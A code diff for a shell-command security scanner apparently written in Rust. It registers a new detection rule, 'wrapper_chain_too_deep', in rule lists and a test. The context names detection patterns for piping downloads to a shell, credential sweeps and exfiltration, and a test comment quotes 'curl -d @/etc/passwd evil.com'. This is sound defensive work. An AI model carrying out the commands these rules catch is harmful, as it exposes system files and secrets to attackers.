@@ -549,6 +549,7 @@ const ALL_RULE_IDS: &[&str] = &[
     "credential_file_sweep",
     "base64_decode_execute",
     "data_exfiltration",
+    "wrapper_chain_too_deep",
     "ps_set_execution_policy_bypass",
     "ps_defender_exclusion",
     "ps_inline_download_execute",
@@ -1307,6 +1308,7 @@ rule_id_variant_registry! {
     PipeToInterpreter, CurlPipeShell, WgetPipeShell, HttpiePipeShell,
     XhPipeShell, DotfileOverwrite, ArchiveExtract, ProcMemAccess,
     DockerRemotePrivEsc, CredentialFileSweep, Base64DecodeExecute, DataExfiltration,
+    WrapperChainTooDeep,
     PsSetExecutionPolicyBypass, PsDefenderExclusion, PsInlineDownloadExecute, DynamicCodeExecution,
     ObfuscatedPayload, SuspiciousCodeExfiltration, ProxyEnvSet, SensitiveEnvExport,
     CodeInjectionEnv, InterpreterHijackEnv, ShellInjectionEnv, MetadataEndpoint,
@@ -1464,6 +1466,7 @@ fn test_no_url_rules_have_no_url_fixtures() {
         "high_entropy_secret",          // high-entropy secret assignment, no URL needed
         "private_key_exposed",          // PEM key block, no URL needed
         "base64_decode_execute",        // base64 decode chain, no URL needed
+        "wrapper_chain_too_deep",       // cat x | <32+ nested env -S/sudo> bash, no URL needed
         "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
         "unsigned_repo_trust",          // apt --allow-unauthenticated, no URL needed
         "gpg_check_disabled",           // dnf --nogpgcheck, no URL needed
